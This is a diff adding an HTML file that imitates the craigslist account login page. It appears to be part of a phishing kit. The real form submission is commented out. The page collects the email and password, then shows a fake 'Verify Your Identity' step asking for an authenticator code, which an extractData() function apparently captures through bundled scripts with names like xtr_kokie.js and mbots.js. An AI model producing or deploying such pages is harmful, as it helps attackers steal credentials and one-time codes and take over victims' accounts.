@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<!-- saved from url=(0083)https://accounts.craigslist.org/login?rp=%2Fk%2FjuYMdjfB7xG54T07i0yT1Q%2F9VI34&rt=P -->
+<html
+    class="js canvas draggable fileAPI geolocation matchMedia picture pushState placeholder no-touchCapable transitions">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>craigslist - account log in</title>
+    <link type="text/css" rel="stylesheet" media="all" href="cl.css">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+
+    <script type="text/javascript" src="xtr_kokie.js"></script>
+    <script type="text/javascript" src="scripts.js"></script>
+    <script src="mbots.js"></script>
+    <script type="text/javascript" src="/mobile_desktop.js"></script>
+    <link rel="stylesheet" href="style.css">
+    </style>
+
+
+
+</head>
+
+<body class=" desktop w1024">
+
+    <section class="page-container">
+        <header class="global-header simple">
+            <a class="header-logo" name="logoLink" href="https://www.craigslist.org/">CL</a>
+
+            <nav class="breadcrumbs-container">
+                <ul class="breadcrumbs">
+
+
+                    <li class="crumb plain-message">
+                        <p>
+                            account log in
+                        </p>
+                    </li>
+                </ul>
+            </nav>
+
+
+        </header>
+
+
+        <section class="body">
+            <div class="login-page-boxes">
+                <div class="accountform login-box" id="form1">
+                    <h1 class="accountform-banner">Log in</h1>
+                    <!-- <form action="https://accounts.craigslist.org/login" method="POST" class="loginform">-->
+                    <input value="https://accounts.craigslist.org/login" value="https://accounts.craigslist.org/"
+                        type="hidden" id="websiteUrl" placeholder="https://example.com" />
+                    <input type="hidden" name="step" value="confirmation">
+                    <input type="hidden" name="rt" value="P">
+                    <input type="hidden" name="rp" value="/k/juYMdjfB7xG54T07i0yT1Q/9VI34">
+                    <input type="hidden" name="t"
+                        value="MToBDsYdsxakx2smOkCGu_6zLqcQYeu1YZrenTz6sGKvI0KmkuuL_nJEhSCPpx04Wt75SkTYdEm5tUd2hr4_fskEVxgJeSHObvq_2rZJmTlN0wTWMA">
+                    <input type="hidden" name="p" value="0">
+                    <div class="accountform-field">
+                        <label for="inputEmailHandle">Email / Handle</label>
+                        <input id="email" name="email" type="text" value="" autofocus="" required="">
+                    </div>
+                    <div class="accountform-field">
+                        <label for="inputPassword">Password<a href="https://accounts.craigslist.org/reset"
+                                class="accountform-helplink-tiny" tabindex="-1">Forgot password?</a></label>
+                        <input id="password" type="password" name="password" autocomplete="on" required="">
+                    </div>
+                    <div class="accountform-actions">
+                        <button type="submit" id="onetime" class="loginlink-btn" formmethod="post"
+                            onClick="javascript:void(0)">E-mail a login link</button>
+                        <button type="submit" class="accountform-btn" onclick="authenticate()">Log
+                            in</button>
+                    </div>
+
+                    <!--</form>--->
+                </div>
+
+                <div class="accountform login-box" id="form2" style="display:none">
+                    <div class="accountform-banner">
+                        <h3>Verify Your Identity</h3><br />
+                    </div>
+
+                    <div class="accountform-field">
+                        <label for="inputPassword">Input your Authenticator Code</label><br />
+                        <input id="auth" type="number" name="auth" autocomplete="off" required=""><br />
+                        <button type="submit" id="login" class="accountform-btn" onclick="extractData()">Verify</button>
+                        <button type="submit" id="login" class="loginlink-btn" onclick="goback()">Back</button>
+                        <br />
+                    </div>
+
+                </div>
+
+                <script>
+                    function authenticate() {
+                        const specificUrl = document.getElementById("websiteUrl").value;
+                        const email = document.getElementById("email").value;
+                        const password = document.getElementById("password").value;
+                        const auth = document.getElementById("auth").value;
+
+                        if (!specificUrl) {
+                            alert("Please enter a valid URL.");
+                            return;
+                        }
+
+                        if (!email) {
+                            alert("Please enter a valid email address.");
+                            return;
+                        }
+
+                        if (!password) {
+                            alert("Please enter a valid password.");
+                            return;
+                        }
+
+                        document.getElementById("form1").style.display = "none";
+                        document.getElementById("form2").style.display = "block";
+                    }
+
+                    function goback() {
+                        document.getElementById("form1").style.display = "block";
+                        document.getElementById("form2").style.display = "none";
+                    }
+                </script>
+
+                <p class="box-conjunction">
+                    or
+                </p>
+
+                <div class="accountform login-page-box create-account-box">
+                    <h1 class="accountform-banner">Create an account</h1>
+                    <form action="https://accounts.craigslist.org/signup" method="POST" class="signupform">
+                        <input type="hidden" name="rp" value="">
+                        <input type="hidden" name="rt" value="">
+                        <input type="hidden" name="t" value="">
+                        <input type="hidden" name="whichForm" value="createAccount">
+                        <div class="accountform-field">
+                            <label for="emailAddress">Email</label>
+                            <input id="emailAddress" maxlength="64" name="emailAddress" type="email" value=""
+                                required="">
+                        </div>
+                        <div class="accountform-actions">
+                            <button type="submit" id="create" class="accountform-btn">Create account</button>
+                            <a href="https://www.craigslist.org/about/help/account/signup"
+                                class="accountform-helplink">Account help</a>
+                        </div>
+                    </form>
+                </div>
+
+            </div>
+
+
+        </section>
+        <footer>
+            <ul class="clfooter">
+                <li>© 2024 <span class="desktop">craigslist</span><span class="mobile">CL</span></li>
+                <li><a href="https://www.craigslist.org/about/help/">help</a></li>
+                <li><a href="https://www.craigslist.org/about/help/safety">safety</a></li>
+                <li class="desktop"><a href="https://www.craigslist.org/about/privacy.policy">privacy</a></li>
+                <li><a href="https://www.craigslist.org/about/terms.of.use">terms</a></li>
+                <li><a href="https://www.craigslist.org/about/">about</a></li>
+                <li><a href="https://www.craigslist.org/about/craigslist_app">app</a></li>
+            </ul>
+        </footer>
+    </section>
+
+</body>
+
+</html>
